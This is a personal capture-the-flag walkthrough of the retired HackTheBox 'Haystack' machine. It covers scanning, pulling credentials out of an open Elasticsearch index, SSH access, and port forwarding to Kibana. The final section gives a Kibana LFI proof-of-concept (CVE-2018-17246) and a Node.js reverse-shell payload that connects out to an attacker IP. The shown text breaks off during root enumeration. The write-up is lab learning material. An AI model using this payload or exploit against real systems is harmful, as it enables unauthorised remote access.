# Haystack
## Linux
### HackTheBox
### Easy (Retired)

* IP: 10.129.251.234
* Host: http://haystack.htb

### NMAP
```Console
22/tcp ssh  OpenSSH 7.4 (protocol 2.0)
80/tcp http nginx 1.12.2
  http-methods:
    Supported Methods: GET HEAD
  http-server-header: nginx/1.12.2
  http-title: Site doesn't have a title (text/html).
9200/tcp http nginx 1.12.2
  http-title: Site doesn't have a title (application/json; charset=UTF-8).
  http-favicon: Unknown favicon MD5: 6177BFB75B498E0BB356223ED76FFE43
  http-methods:
    Supported Methods: HEAD DELETE GET OPTIONS
    Potentially risky methods: DELETE
  http-server-header: nginx/1.12.2
```

### Directories
```Console
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://haystack.htb
 🚀  Threads               │ 200
 📖  Wordlist              │ /Users/jeremiahshafer/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔎  Extract Links         │ true
 💾  Output File           │ dirs/initialdirs.log
 💲  Extensions            │ [php, html, txt]
 📍  Follow Redirects      │ true
───────────────────────────┴──────────────────────
200        5l        7w       55c http://haystack.htb/index.html
```

__Nikto Port 80__
```Console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.251.234
+ Target Hostname:    haystack.htb
+ Target Port:        80
+ Start Time:         2021-11-08 13:23:05 (GMT-6)
---------------------------------------------------------------------------
+ Server: nginx/1.12.2
+ Server leaks inodes via ETags, header found with file /, fields: 0x5c4b9e1a 0x37
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7445 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-11-08 13:29:08 (GMT-6) (363 seconds)
```

### http://haystack.htb:9200/
* JSON content?
```JSON
{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
```

__Directories__
```Console
❯ gobuster dir -u http://haystack.htb:9200 -b 400,404,405 -t 200 -x php,html -w ~/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirs/port9200dirs.log --no-error --timeout 15s --hide-length 2
===============================================================
[+] Url:                     http://haystack.htb:9200
[+] Wordlist:                /SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   400,404,405
[+] Extensions:              php,html
[+] Timeout:                 15s
===============================================================
/quotes               (Status: 200)
/bank                 (Status: 200)
/**http%3A%2F%2Fwww.php (Status: 200)
/**http%3A%2F%2Fwww   (Status: 200)
/**http%3A%2F%2Fwww.html (Status: 200)
/devinmoore*          (Status: 200)
/devinmoore*.php      (Status: 200)
/devinmoore*.html     (Status: 200)
/200109*              (Status: 200)
/200109*.php          (Status: 200)
/200109*.html         (Status: 200)
/_stats               (Status: 200)
/bank                 (Status: 200)
/_template            (Status: 200)
/quotes               (Status: 200)
```
__Nikto port 9200__
```Console
❯ nikto -h http://haystack.htb -p 9200 -o port9200Nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.251.234
+ Target Hostname:    haystack.htb
+ Target Port:        80
+ Start Time:         2021-11-08 13:48:18 (GMT-6)
---------------------------------------------------------------------------
+ Server: nginx/1.12.2
+ Server leaks inodes via ETags, header found with file /, fields: 0x5c4b9e1a 0x37
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7445 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-11-08 13:54:44 (GMT-6) (386 seconds)
---------------------------------------------------------------------------
```

__Response Header:__
> Connection	keep-alive
> Content-Length	40327
> Content-Type	application/json; charset=UTF-8
> Date	Mon, 08 Nov 2021 19:57:07 GMT
> Server	nginx/1.12.2

__Request Header:__
> Accept	text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
> Accept-Encoding	gzip, deflate
> Accept-Language	en-US,en;q=0.5
> Connection	keep-alive
> Host	haystack.htb:9200
> Upgrade-Insecure-Requests	1
> User-Agent	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0

__Directories:__
```Console
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://haystack.htb:9200
 🚀  Threads               │ 200
 📖  Wordlist              │ /Users/jeremiahshafer/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💢  Status Code Filters   │ [404, 400, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔎  Extract Links         │ true
 💾  Output File           │ dirs/Port9200BigList.log
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l        1w      338c http://haystack.htb:9200/quotes
200        1l        1w     1010c http://haystack.htb:9200/bank
200        1l        1w        2c http://haystack.htb:9200/*checkout*
200        1l        1w     4136c http://haystack.htb:9200/*
200        1l        1w        2c http://haystack.htb:9200/*docroot*
200        1l        1w        2c http://haystack.htb:9200/**http%3a
200        1l        1w        2c http://haystack.htb:9200/*http%3A
200        1l        1w        2c http://haystack.htb:9200/**http%3A
200        1l        1w        2c http://haystack.htb:9200/**http%3A%2F%2Fwww
200        1l        1w        2c http://haystack.htb:9200/devinmoore*
200        1l        1w        2c http://haystack.htb:9200/*sa_
200        1l        1w        2c http://haystack.htb:9200/*dc_
200        1l        1w        2c http://haystack.htb:9200/200109*
200        1l        1w        2c http://haystack.htb:9200/IGo%202006%20with%20Romania%20Map%20*Cracked*
200        1l        1w        2c http://haystack.htb:9200/V13a****gazeta_ru
200        1l        1w        2c http://haystack.htb:9200/V13a****pravda_ru
200        1l        1w    40327c http://haystack.htb:9200/_template
200        1l        1w        2c http://haystack.htb:9200/eskimo*macrame
200        1l        1w        2c http://haystack.htb:9200/jaimevives*
200        1l        1w        2c http://haystack.htb:9200/2001*sa_
200        1l        1w        2c http://haystack.htb:9200/ultra_secure*
200        1l        1w        2c http://haystack.htb:9200/V11***talsa_fi
200        1l        1w        2c http://haystack.htb:9200/HamOffice%20%2AGERMAN%2A%20v3
200        1l        1w        2c http://haystack.htb:9200/Back%20Alarm%20Clock%20%2ADOT%20NET%2A%20v2
200        1l        1w        2c http://haystack.htb:9200/174*93
200        1l        1w        2c http://haystack.htb:9200/66*35
200        1l        1w        2c http://haystack.htb:9200/96*163
200        1l        1w        2c http://haystack.htb:9200/66*36
200        1l        1w        2c http://haystack.htb:9200/96*170
200        1l        1w        2c http://haystack.htb:9200/117*169
200        1l        1w        2c http://haystack.htb:9200/117*64
200        1l        1w        2c http://haystack.htb:9200/300*164
200        1l        1w        2c http://haystack.htb:9200/133*73
200        1l        1w        2c http://haystack.htb:9200/36*36
200        1l        1w        2c http://haystack.htb:9200/152*84
200        1l        1w        2c http://haystack.htb:9200/67*36
200        1l        1w        2c http://haystack.htb:9200/srch-*wuauclt
200        1l        1w        2c http://haystack.htb:9200/srch-*WindowsAudio
200        1l        1w        2c http://haystack.htb:9200/srch-w****
200        1l        1w        2c http://haystack.htb:9200/srch-*winstats
200        1l        1w        2c http://haystack.htb:9200/srch-*WinLogon
200        1l        1w        2c http://haystack.htb:9200/srch-*****
200        1l        1w        2c http://haystack.htb:9200/srch-*MS%20Setup
200        1l        1w        2c http://haystack.htb:9200/srch-*windows%20update
200        1l        1w        2c http://haystack.htb:9200/srch-*StateMgr
200        1l        1w        2c http://haystack.htb:9200/srch-*JanisRuckenbrodII
200        1l        1w        2c http://haystack.htb:9200/srch-*Microsoft%20Update
200        1l        1w        2c http://haystack.htb:9200/srch-*Security%20Center
200        1l        1w        2c http://haystack.htb:9200/srch-stubinstaller****
200        1l        1w        2c http://haystack.htb:9200/*JanisRuckenbrodII-39
200        1l        1w        2c http://haystack.htb:9200/*MicrosoftUpdate-40
200        1l        1w        2c http://haystack.htb:9200/*MicrosoftUpdate-41
200        1l        1w        2c http://haystack.htb:9200/*windowsupdate-52
200        1l        1w        2c http://haystack.htb:9200/*windowsupdate-51
200        1l        1w        2c http://haystack.htb:9200/*windowsupdate-53
200        1l        1w        2c http://haystack.htb:9200/*MicrosoftUpdate-42
200        1l        1w        2c http://haystack.htb:9200/*SecurityCenter-46
200        1l        1w        2c http://haystack.htb:9200/*MicrosoftUpdate-43
200        1l        1w        2c http://haystack.htb:9200/*windowsupdate-54
200        1l        1w        2c http://haystack.htb:9200/*MicrosoftUpdate-44
200        1l        1w        2c http://haystack.htb:9200/*windowsupdate-48
200        1l        1w        2c http://haystack.htb:9200/*MSSetup-45
200        1l        1w        2c http://haystack.htb:9200/*windowsupdate-50
200        1l        1w        2c http://haystack.htb:9200/*windowsupdate-49
200        1l        1w        2c http://haystack.htb:9200/*StateMgr-47
200        1l        1w        2c http://haystack.htb:9200/*windowsupdate-56
200        1l        1w        2c http://haystack.htb:9200/*windowsupdate-55
200        1l        1w        2c http://haystack.htb:9200/*WindowsAudio-58
200        1l        1w        2c http://haystack.htb:9200/w****
200        1l        1w        2c http://haystack.htb:9200/*WinLogon-59
200        1l        1w        2c http://haystack.htb:9200/*winstats-60
200        1l        1w        2c http://haystack.htb:9200/*WindowsfilenameChecker-57
200        1l        1w        2c http://haystack.htb:9200/*wuauclt
200        1l        1w        2c http://haystack.htb:9200/V11***tdckoncern_dk
200        1l        1w        2c http://haystack.htb:9200/*424
200        1l        1w        2c http://haystack.htb:9200/*27_20them
200        1l        1w        2c http://haystack.htb:9200/**https%3A
200        1l        1w        2c http://haystack.htb:9200/V11***dr_dk
200        1l        1w        2c http://haystack.htb:9200/V11***gaffa_dk
200        1l        1w        2c http://haystack.htb:9200/V11***afterdawn_fi
200        1l        1w        2c http://haystack.htb:9200/**hisgen**
200        1l        1w        2c http://haystack.htb:9200/MooseTV*
200        1l        1w     4136c http://haystack.htb:9200/**
200        1l        1w        2c http://haystack.htb:9200/*-http%3a
200        1l        1w        2c http://haystack.htb:9200/**http%253A
200        1l        1w     4136c http://haystack.htb:9200/%2a
200        1l        1w        2c http://haystack.htb:9200/0SwAAAMEWDFg8YsQFLdGdWso9*LDKH69RwYRFVfWLY4!R4cshBFiF828rHevN*G079wmFnW5w4RT0cU5zPnZGHVzvRQ6ESOhcsPLje2upEXOxBrlHMYGylQ
200        1l        1w        2c http://haystack.htb:9200/**http%3A%2F%2Fad
200        1l        1w        2c http://haystack.htb:9200/**http%3A%2F%2Fnews
200        1l        1w        2c http://haystack.htb:9200/V11***idg_no
200        1l        1w     4136c http://haystack.htb:9200/*****
200        1l        1w        2c http://haystack.htb:9200/V13a****cnews_ru
200        1l        1w        2c http://haystack.htb:9200/dhamel*
200        1l        1w        2c http://haystack.htb:9200/V13a****yandex_ru
200        1l        1w        2c http://haystack.htb:9200/**https%3a
200        1l        1w        2c http://haystack.htb:9200/query%3D*
200        1l        1w        2c http://haystack.htb:9200/*https%3A
200        1l        1w        2c http://haystack.htb:9200/***Error***
200        1l        1w        2c http://haystack.htb:9200/xp-pro*
200        1l        1w        2c http://haystack.htb:9200/0RAARA*EU29pPv7U0BbgphVb*UH1!HdU1w0RM*UH*8Wnmma32kGbiGegIqscdKSr3qVU!bm*j78p7Cni!T3XhPLJhGlCU!CEdXDZwqcFFASg
200        1l        1w        2c http://haystack.htb:9200/*http%3a
200        1l        1w        2c http://haystack.htb:9200/*https%3a
200        1l        1w        2c http://haystack.htb:9200/V11***tch_ie
200        1l        1w        2c http://haystack.htb:9200/V11***dmi_dk
200        1l        1w        2c http://haystack.htb:9200/**http%3A%2F%2Fdeveloper
200        1l        1w        2c http://haystack.htb:9200/*cdbr
200        1l        1w     4136c http://haystack.htb:9200/_all
200        1l        1w        2c http://haystack.htb:9200/*-http%3A
200        1l        1w        2c http://haystack.htb:9200/*-http%253A
200        1l        1w        2c http://haystack.htb:9200/8*2
200        1l        1w        2c http://haystack.htb:9200/V11***idg_dk
200        1l        1w        2c http://haystack.htb:9200/stuntdubl*
200        1l        1w        2c http://haystack.htb:9200/V11***hesari_fi
200        1l        1w        2c http://haystack.htb:9200/V11***aftenposten_no
200        1l        1w    16676c http://haystack.htb:9200/_stats
200        9l       37w     1529c http://haystack.htb:9200/favicon.ico
```

* Nothing immediately stands out.
* Went back to the main page and looked at the image again.

### http://haystack.htb/needle.jpg
* used `strings` on the image and found a `base64` string:
```Console
❯ echo 'bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==' | base64 -d
la aguja en el pajar es "clave"%
```
* Translation (Spanish): the needle in the haystack is "key"
* used `strings -n 20` to get longer strings:
```Console
❯ strings -n 20 needle.jpg
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
```

### Port 9200
```JSON
{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
```
 * JSON API running `Elasticsearch 6.4.2`

__Elasticsearch 6.4.2__

> URL-based access control
> 
> Many users use a proxy with URL-based access control to secure access to Elasticsearch indices. For multi-search, multi-get, and bulk
> requests, the user has the choice of specifying an index in the URL and on each individual request within the request body. This can make
> URL-based access control challenging.
> 
> To prevent the user from overriding the index which has been specified in the URL, add this setting to the elasticsearch.yml file:
> 
> rest.action.multi.allow_explicit_index: false
> 
> The default value is true, but when set to false, Elasticsearch will reject requests that have an explicit index specified in the request
> body.
 - [Elasticsearch - 6.4.2 documentation](https://www.elastic.co/guide/en/elasticsearch/reference/6.8/docs-multi-get.html)

> If you work from the command line often, the cat APIs will be helpful to you. Named after the linux cat command, these APIs are designed to
> work like `*nix` command-line tools.
> 
> They provide statistics that are identical to all the previously discussed APIs (Health, node-stats, and so forth), but present the output in
> tabular form instead of JSON. This is very convenient for a system administrator, and you just want to glance over your cluster or find nodes
> with high memory usage.
> 
> Executing a plain GET against the cat endpoint will show you all available APIs:
> 
> To enable headers, add the ?v parameter

* `❯ curl 'http://haystack.htb:9200/_cat/indices?v'`

|health |status | index    | uuid                   | pri | rep | docs.count | docs.deleted | store.size | pri.store.size |
|-------|-------|----------|------------------------|-----|-----|------------|--------------|------------|----------------|
| green | open  | .kibana  |6tjAYZrgQ5CwwR0g6VOoRg  | 1   | 0   |       1    |        0     |        4kb |           4kb  |
| yellow| open  | quotes   |ZG2D1IqkQNiNZmi2HRImnQ  | 5   | 1   |     253    |        0     |    262.7kb |       262.7kb  |
| yellow| open  | bank     |eSVpNfCfREyYoVigNWcrMw  | 5   | 1   |    1000    |        0     |    483.2kb |       483.2kb  |

```Console
❯ curl -s 'http://haystack.htb:9200/_search?size=1000' -H 'Content-type: application/json' > port9200_searchSize1000.json
❯ python -m json.tool port9200_searchSize1000.json > port9200_searchSize1000pretty.json
❯ cat port port9200_searchSize1000pretty.json | grep 'clave'
cat: port: No such file or directory
                    "quote": "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
```
* used `grep` to find the word "clave" based on the findings earlier:
```Console
❯ echo 'bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==' | base64 -d
la aguja en el pajar es "clave"%
```
 * The needle in the haystack is "key", but I searched for the spanish word "clave".

__Found "quote": "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="__
* Translation: "This key cannot be lost, I save it here: cGFzczogc3BhbmlzaC5pcy5rZXk="
```Console
❯ echo -e 'cGFzczogc3BhbmlzaC5pcy5rZXk=' | base64 -d
pass: spanish.is.key
```
* Found another instance of "clave"
```Console
{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}
```
* Translation: 'I have to save the password for the machine'
```Console
❯ echo 'dXNlcjogc2VjdXJpdHkg' | base64 -d
user: security
```

__SSH into machine with credentials__
```Console
❯ ssh security@haystack.htb
The authenticity of host 'haystack.htb (10.129.251.234)' can't be established.
ED25519 key fingerprint is SHA256:J8TOL2f2yaJILidImnrtW2e2lcroWsFbo0ltI9Nxzfw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'haystack.htb' (ED25519) to the list of known hosts.

security@haystack.htb's password: spanish.is.key
Last login: Wed Feb  6 20:53:59 2019 from 192.168.2.154
[security@haystack ~]$
```
 * Logged in as `security` and immediately found `user.txt`:
User flag: 04d~~~~~~~~~[takeAbreath]~~~~~~~

### PrivEsc
* User `security` does not have access to `sudo`
```Console
[security@haystack /]$ find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```
__Linpeas__
```Console
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strace Not Found
-rws--x--x. 1 root root 24K Oct 30  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rws--x--x. 1 root root 24K Oct 30  2018 /usr/bin/chsh (Unknown SUID binary)
-rwsr-xr-x. 1 root root 44K Oct 30  2018 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x. 1 root root 63K Oct 30  2018 /usr/bin/chage (Unknown SUID binary)
-rwsr-xr-x. 1 root root 77K Oct 30  2018 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 41K Oct 30  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x. 1 root root 32K Oct 30  2018 /usr/bin/su
-rwsr-xr-x. 1 root root 32K Oct 30  2018 /usr/bin/umount  --->  BSD/Linux(08-1996)
---s--x--x. 1 root root 144K Oct 30  2018 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x. 1 root root 24K Oct 30  2018 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x. 1 root root 57K Nov 20  2018 /usr/bin/crontab (Unknown SUID binary)
-rwsr-xr-x. 1 root root 28K Jun 10  2014 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x. 1 root root 11K Apr 11  2018 /usr/sbin/pam_timestamp_check
-rwsr-xr-x. 1 root root 36K Apr 11  2018 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 12K Oct 30  2018 /usr/sbin/usernetctl
-rwsr-xr-x. 1 root root 16K Oct 30  2018 /usr/lib/polkit-1/polkit-agent-helper-1
-r-sr-xr-x. 1 root root 14K Aug 27  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-r-sr-xr-x. 1 root root 14K Aug 27  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-rwsr-x---. 1 root dbus 57K Nov  2  2018 /usr/libexec/dbus-1/dbus-daemon-launch-helper (Unknown SUID binary)

╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
-rw-r--r--. 1 root root 231 Oct 30  2018 /etc/skel/.bashrc
-rw-r--r--. 1 security security 231 Apr 10  2018 /home/security/.bashrc

╔══════════╣ Analyzing Kibana Files (limit 70)
-rw-r--r--. 1 root root 5088 Jan 25  2019 /etc/kibana/kibana.yml
server.port: 5601
server.host: "127.0.0.1"
elasticsearch.url: "http://localhost:9200"

-rw-r--r--. 1 root root 475 Oct 30  2018 /usr/lib/firewalld/services/vnc-server.xml
<?xml version="1.0" encoding="utf-8"?>
<service>
  <short>Virtual Network Computing Server (VNC)</short>
  <description>A VNC server provides an external accessible X session. Enable this option if you plan to provide a VNC server with direct access. The access will be possible for displays :0 to :3. If you plan to provide access with SSH, do not open this option and use the via option of the VNC viewer.</description>
  <port protocol="tcp" port="5900-5903"/>
</service>

╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r--. 1 root root 1007 Mar  6  2018 /etc/nginx/fastcgi_params

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash
security:x:1000:1000:security:/home/security:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(security) gid=1000(security) groups=1000(security)
uid=11(operator) gid=0(root) groups=0(root)
uid=12(games) gid=100(users) groups=100(users)
uid=14(ftp) gid=50(ftp) groups=50(ftp)
uid=192(systemd-network) gid=192(systemd-network) groups=192(systemd-network)
uid=1(bin) gid=1(bin) groups=1(bin)
uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m)
uid=3(adm) gid=4(adm) groups=4(adm)
uid=4(lp) gid=7(lp) groups=7(lp)
uid=5(sync) gid=0(root) groups=0(root)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=74(sshd) gid=74(sshd) groups=74(sshd)
uid=7(halt) gid=0(root) groups=0(root)
uid=81(dbus) gid=81(dbus) groups=81(dbus)
uid=89(postfix) gid=89(postfix) groups=89(postfix),12(mail)
uid=8(mail) gid=12(mail) groups=12(mail)
uid=994(kibana) gid=992(kibana) groups=992(kibana)
uid=995(nginx) gid=993(nginx) groups=993(nginx)
uid=996(logstash) gid=994(logstash) groups=994(logstash)
uid=997(elasticsearch) gid=995(elasticsearch) groups=995(elasticsearch)
uid=998(chrony) gid=996(chrony) groups=996(chrony)
uid=999(polkitd) gid=998(polkitd) groups=998(polkitd)
uid=99(nobody) gid=99(nobody) groups=99(nobody)

╔══════════╣ Networks and neighbours
10.129.0.1 dev ens160 lladdr 00:50:56:b9:2b:b5 REACHABLE
IP address       HW type     Flags       HW address            Mask     Device
10.129.0.1       0x1         0x2         00:50:56:b9:2b:b5     *        ens160

╔══════════╣ Hostname, hosts and DNS
haystack
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
nameserver 1.1.1.1
nameserver 8.8.8.8

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/security/.local/bin:/home/security/bin
New path exported: /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/security/.local/bin:/home/security/bin:/sbin:/bin

```
* Nothing stands out form linpeas. Checked the process capabilities, based on [this section in Hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#processes-capabilities)

```Console
[security@haystack home]$ cat /proc/net/tcp | grep '00000000:0000 0A'
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 38071 1 ffff93b16e2407c0 100 0 0 10 0                     
   1: 00000000:23F0 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 38070 1 ffff93b16e240f80 100 0 0 10 0                     
   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37910 1 ffff93b16e240000 100 0 0 10 0                     
   3: 0100007F:15E1 00000000:0000 0A 00000000:00000000 00:00000000 00000000   994
```
* Converted from Hex using a script from [this gist](https://gist.github.com/jkstill/5095725):
```Console
❯ ./hexip.pl 00000000 0050
hex: 00000000
IP: 0.0.0.0  PORT: 80

❯ ./hexip.pl 00000000 23F0
hex: 00000000
IP: 0.0.0.0  PORT: 9200

❯ ./hexip.pl 00000000 0016
hex: 00000000
IP: 0.0.0.0  PORT: 22

❯ ./hexip.pl 0100007F 15E1
hex: 0100007F
IP: 127.0.0.1  PORT: 5601
```
* Port forwarding through port 5601 at `ip 127.0.0.1`
```
❯ ssh -L 5601:127.0.0.1:5601 security@haystack.htb
security@haystack.htb's password:
Last login: Mon Nov  8 17:55:37 2021 from 10.10.14.152
[security@haystack ~]$
```
* Visiting `127.0.0.1:5601` brings me to a `http://127.0.0.1:5601/app/kibana#/home?_g=()`

### CVE-2018-17246
[Writeup Here](https://www.cyberark.com/resources/threat-research-blog/execute-this-i-know-you-have-it)
```Console
Elasticsearch Kibana Console插件LFI CVE-2018-17246

PoC：
GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
```

__Reverse shell using javascript__
```Console
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.8", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
 * Saved in /dev/shm
 * Visited `http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/takeabreath.js` in my browser to trigger the reverse shell.

__Netcat:__
```Console
❯ ncat -lvnp 4242
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.129.251.234.
Ncat: Connection from 10.129.251.234:53882.
whoami
kibana
```
```Console
❯ ncat -lvnp 4242
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.129.251.234.
Ncat: Connection from 10.129.251.234:53882.
whoami
kibana
which python
/usr/bin/python
which python3
which: no python3 in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin)
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$ export TERM=xterm
export TERM=xterm
bash-4.2$ reset
reset

bash-4.2$ ls
ls
bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 media	opt  root  sbin  sys  usr
bash-4.2$ ls
ls
bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 media	opt  root  sbin  sys  usr
bash-4.2$ psaux | grep "root"
psaux | grep "root"
bash: psaux: no se encontró la orden
bash-4.2$ ps awuxx | grep 'root'
ps awuxx | grep 'root'
root          1  0.0  0.1 127992  6560 ?        Ss   15:16   0:02 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root          2  0.0  0.0      0     0 ?        S    15:16   0:00 [kthreadd]
root          3  0.0  0.0      0     0 ?        S    15:16   0:05 [ksoftirqd/0]
root          5  0.0  0.0      0     0 ?        S<   15:16   0:00 [kworker/0:0H]
root          6  0.0  0.0      0     0 ?        S    15:16   0:00 [kworker/u256:0]
root          7  0.0  0.0      0     0 ?        S    15:16   0:00 [migration/0]
root          8  0.0  0.0      0     0 ?        S    15:16   0:00 [rcu_bh]
root          9  0.0  0.0      0     0 ?        S    15:16   0:07 [rcu_sched]
root         10  0.0  0.0      0     0 ?        S<   15:16   0:00 [lru-add-drain]
root         11  0.0  0.0      0     0 ?        S    15:16   0:00 [watchdog/0]
root         13  0.0  0.0      0     0 ?        S    15:16   0:00 [kdevtmpfs]
root         14  0.0  0.0      0     0 ?        S<   15:16   0:00 [netns]
root         15  0.0  0.0      0     0 ?        S    15:16   0:00 [khungtaskd]
root         16  0.0  0.0      0     0 ?        S<   15:16   0:00 [writeback]
root         17  0.0  0.0      0     0 ?        S<   15:16   0:00 [kintegrityd]
root         18  0.0  0.0      0     0 ?        S<   15:16   0:00 [bioset]
root         19  0.0  0.0      0     0 ?        S<   15:16   0:00 [bioset]
root         20  0.0  0.0      0     0 ?        S<   15:16   0:00 [bioset]
root         21  0.0  0.0      0     0 ?        S<   15:16   0:00 [kblockd]
root         22  0.0  0.0      0     0 ?        S<   15:16   0:00 [md]
root         23  0.0  0.0      0     0 ?        S<   15:16   0:00 [edac-poller]
root         24  0.0  0.0      0     0 ?        S<   15:16   0:00 [watchdogd]
root         30  0.0  0.0      0     0 ?        S    15:16   0:00 [kswapd0]
